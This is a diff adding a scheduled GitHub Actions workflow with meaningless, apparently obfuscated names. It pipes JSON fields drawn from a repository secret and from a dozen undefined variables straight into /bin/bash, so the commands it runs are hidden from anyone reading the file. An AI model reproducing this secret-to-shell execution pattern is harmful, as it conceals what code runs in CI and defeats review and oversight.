@@ -1,0 +1,30 @@
+name: jiangpingyanbi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '45 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiangpingyanbi
+        env:
+          aip49: ${{ secrets.aip49 }}
+        run: |
+          echo $aip49 | jq -r .ue2 | /bin/bash
+          echo $s572 | jq -r .c64521 | /bin/bash
+          echo $iuac9145 | jq -r .oc5287 | /bin/bash
+          echo $mnr301 | jq -r .tdpp318 | /bin/bash
+          echo $vnh58 | jq -r .ncqk9 | /bin/bash
+          echo $v81791 | jq -r .tjxyk486 | /bin/bash
+          echo $htt5 | jq -r .l405 | /bin/bash
+          echo $vz93 | jq -r .lzskj36 | /bin/bash
+          echo $nils15855 | jq -r .flq6718 | /bin/bash
+          echo $cij5 | jq -r .ip9 | /bin/bash
+          echo $ikbp82 | jq -r .gfre27391 | /bin/bash
+          echo $vwlj02087 | jq -r .hn7817 | /bin/bash
+          echo $sgipd3079 | jq -r .lza2 | /bin/bash
+
